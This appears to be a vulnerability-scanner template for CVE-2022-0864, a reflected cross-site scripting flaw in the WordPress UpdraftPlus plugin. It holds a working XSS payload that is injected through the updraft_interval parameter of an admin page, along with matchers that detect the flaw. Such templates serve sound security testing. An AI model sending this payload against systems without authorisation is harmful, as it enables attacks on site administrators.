id: CVE-2022-0864

info:
  name: UpdraftPlus < 1.22.9 - Reflected Cross-Site Scripting
  author: Akincibor
  severity: medium
  description: The plugin does not sanitise and escape the updraft_interval parameter before outputting it back in an admin page, leading to a Reflected Cross-Site Scripting (XSS) vulnerability.

  reference: https://wpscan.com/vulnerability/7337543f-4c2c-4365-aebf-3423e9d2f872
  tags: xss

requests:
  - method: GET
    path:
      - '{{BaseURL}}//wp-admin/options-general.php?page=updraftplus&updraft_interval"></script><script>confirm(1)</script>'
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        words:
          - "<script>confirm(1)</script>"
        part: body

      - type: word
        words:
          - "text/html"
        part: header